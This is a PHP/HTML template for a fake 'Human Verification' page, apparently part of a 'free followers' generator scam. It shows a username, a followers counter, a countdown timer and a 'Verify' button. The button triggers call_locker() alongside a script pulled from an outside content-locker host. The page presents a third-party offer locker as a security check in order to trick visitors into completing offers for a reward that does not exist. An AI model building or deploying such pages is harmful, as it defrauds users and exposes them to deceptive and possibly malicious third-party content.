<?php

?>
<div class="human-verification-wrapper">
	<h3>Human Verification</h3>
	<p>You are almost done! Click on the Verify Now button below to complete human verification.</p>
	<div class="row verification-user-info">	
		<div class="col-md-6 col-12">	
			<div class="verification-player-panel">	
				<div class="connected-player-item animated bounceIn animation-delay-200">
					<div class="connected-label">Username:</div>
					<div class="connected-player-value connected-username-value"></div>
				</div>
			</div>	
		</div>	
		<div class="col-md-6 col-12">
			<div class="console-generation-item console-generation-item-r-1 animated bounceIn animation-delay-600">
				<img src="img/f-icon.png" class="resource-select-icon" />
				<div class="console-generation-item-value console-generation-item-value-r-1">0</div>
				<div class="resource-item-label">Followers</div>
			</div>
		</div>
	</div>
	<i class="fas fa-spinner fa-spin"></i>
	<div id="h-v-time-left-wrapper" class="h-v-time-left-wrapper">
		<span>Time Left:</span>
		<span id="human_verification_timer_time"></span>
	</div>
	<div class="verification-button-wrapper animated bounceIn animation-delay-1000">
	
	<button type="button" class="btn btn-lg btn-block btn-light mb-1 mt-1 t-bold-i pt-2 pb-2 VB" onclick="call_locker();">Verify</button>
	
		<script type="text/javascript" src="https://filedriving.com/script_include.php?id=1073629"></script>
		
	</div>
</div>
